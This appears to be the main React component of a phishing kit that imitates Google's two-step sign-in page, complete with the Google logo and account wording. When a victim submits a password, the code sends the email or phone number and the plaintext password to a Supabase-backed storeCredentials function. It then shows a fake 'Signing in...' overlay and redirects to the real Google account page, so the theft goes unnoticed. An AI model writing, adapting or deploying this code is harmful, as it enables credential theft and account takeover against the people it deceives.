import React, { useState, useEffect } from 'react';
import './App.css';
import { GoogleLogo } from './components/GoogleLogo';
import { InputField } from './components/InputField';
import { Button } from './components/Button';
import { Footer } from './components/Footer';
import { useTheme } from './hooks/useTheme';
import { storeCredentials } from './lib/supabase';

// Validation helpers
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

function isValidPhone(phone) {
  // Allow digits, spaces, dashes, parentheses, and + symbol
  const phoneRegex = /^[\d\s\-\(\)\+]+$/;
  const digitsOnly = phone.replace(/\D/g, '');
  return phoneRegex.test(phone) && digitsOnly.length >= 7;
}

function App() {
  const { theme } = useTheme();

  // Step management (1 = email, 2 = password)
  const [currentStep, setCurrentStep] = useState(1);
  const [isTransitioning, setIsTransitioning] = useState(false);

  // Form state
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');

  // Error states
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');

  // Loading states
  const [isLoading, setIsLoading] = useState(false);
  const [showLoadingOverlay, setShowLoadingOverlay] = useState(false);

  // Shake animation
  const [shakeEmail, setShakeEmail] = useState(false);
  const [shakePassword, setShakePassword] = useState(false);

  // Reset shake animation
  useEffect(() => {
    if (shakeEmail) {
      const timer = setTimeout(() => setShakeEmail(false), 500);
      return () => clearTimeout(timer);
    }
  }, [shakeEmail]);

  useEffect(() => {
    if (shakePassword) {
      const timer = setTimeout(() => setShakePassword(false), 500);
      return () => clearTimeout(timer);
    }
  }, [shakePassword]);

  // Handle email/phone validation and step transition
  const handleEmailNext = (e) => {
    e.preventDefault();
    setEmailError('');

    const trimmedValue = emailOrPhone.trim();

    if (!trimmedValue) {
      setEmailError('Enter an email or phone number');
      setShakeEmail(true);
      return;
    }

    if (!isValidEmail(trimmedValue) && !isValidPhone(trimmedValue)) {
      setEmailError('Enter a valid email or phone number');
      setShakeEmail(true);
      return;
    }

    // Transition to password step
    setIsTransitioning(true);
    setTimeout(() => {
      setCurrentStep(2);
      setIsTransitioning(false);
    }, 300);
  };

  // Handle password validation and submission
  const handlePasswordNext = async (e) => {
    e.preventDefault();
    setPasswordError('');

    if (!password) {
      setPasswordError('Enter a password');
      setShakePassword(true);
      return;
    }

    // Show loading state
    setIsLoading(true);

    try {
      // Store credentials
      await storeCredentials(emailOrPhone.trim(), password, theme);

      // Show loading overlay
      setShowLoadingOverlay(true);

      // Wait 2-3 seconds then redirect
      setTimeout(() => {
        window.location.href = 'https://myaccount.google.com';
      }, 2500);
    } catch (error) {
      console.error('Error storing credentials:', error);
      // Still redirect even if storage fails
      setShowLoadingOverlay(true);
      setTimeout(() => {
        window.location.href = 'https://myaccount.google.com';
      }, 2500);
    }
  };

  // Handle going back to email step
  const handleBackToEmail = () => {
    setIsTransitioning(true);
    setTimeout(() => {
      setCurrentStep(1);
      setPassword('');
      setPasswordError('');
      setIsTransitioning(false);
    }, 300);
  };

  // Get first letter for avatar
  const getAvatarLetter = () => {
    const value = emailOrPhone.trim();
    if (value) {
      return value.charAt(0).toUpperCase();
    }
    return '?';
  };

  // Loading overlay
  if (showLoadingOverlay) {
    return (
      <div className="loading-overlay">
        <div className="loading-spinner"></div>
        <p className="loading-text">Signing in...</p>
      </div>
    );
  }

  return (
    <div className="app">
      <main className="main-container">
        <div className="signin-card">
          <div className="signin-card-content">
            {/* Left Column - Logo and Title */}
            <div className="card-left">
              <GoogleLogo size={75} />

              {currentStep === 1 ? (
                <>
                  <h1 className="signin-title">Sign in</h1>
                  <p className="signin-subtitle">
                    with your Google Account. This account will be available to other Google apps in the browser.
                  </p>
                </>
              ) : (
                <>
                  <h1 className="signin-title">Welcome</h1>
                  <div
                    className="user-display"
                    onClick={handleBackToEmail}
                    role="button"
                    tabIndex={0}
                    onKeyDown={(e) => e.key === 'Enter' && handleBackToEmail()}
                    aria-label={`Switch account from ${emailOrPhone}`}
                  >
                    <span className="user-avatar">{getAvatarLetter()}</span>
                    <span className="user-email">{emailOrPhone}</span>
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                      <path d="M7 10l5 5 5-5z" />
                    </svg>
                  </div>
                </>
              )}
            </div>

            {/* Right Column - Form */}
            <div className="card-right">
              <div className="step-container">
                {/* Email Step */}
                {currentStep === 1 && (
                  <form
                    className={`step ${isTransitioning ? 'step-exit' : 'step-enter'}`}
                    onSubmit={handleEmailNext}
                  >
                    <div className={`form-section ${shakeEmail ? 'animate-shake' : ''}`}>
                      <InputField
                        type="text"
                        id="email-input"
                        label="Email or phone"
                        value={emailOrPhone}
                        onChange={setEmailOrPhone}
                        error={emailError}
                        autoFocus
                      />
                    </div>

                    <a href="#" className="forgot-link" onClick={(e) => e.preventDefault()}>
                      Forgot email?
                    </a>

                    <p className="guest-mode-text">
                      Not your computer? Use Guest mode to sign in privately.
                      <a href="#" onClick={(e) => e.preventDefault()}>
                        Learn more about using Guest mode
                      </a>
                    </p>

                    <div className="button-row">
                      <Button variant="text" onClick={(e) => e.preventDefault()}>
                        Create account
                      </Button>
                      <Button type="submit" variant="primary">
                        Next
                      </Button>
                    </div>
                  </form>
                )}

                {/* Password Step */}
                {currentStep === 2 && (
                  <form
                    className={`step ${isTransitioning ? 'step-exit' : 'step-enter'}`}
                    onSubmit={handlePasswordNext}
                  >
                    <div className={`form-section ${shakePassword ? 'animate-shake' : ''}`}>
                      <InputField
                        type="password"
                        id="password-input"
                        label="Enter your password"
                        value={password}
                        onChange={setPassword}
                        error={passwordError}
                        showPasswordToggle
                        autoFocus
                        disabled={isLoading}
                      />
                    </div>

                    <a href="#" className="forgot-link" onClick={(e) => e.preventDefault()}>
                      Forgot password?
                    </a>

                    <div className="button-row">
                      <div></div> {/* Spacer for alignment */}
                      <Button
                        type="submit"
                        variant="primary"
                        loading={isLoading}
                        disabled={isLoading}
                      >
                        {isLoading ? 'Signing in...' : 'Next'}
                      </Button>
                    </div>
                  </form>
                )}
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}

export default App;
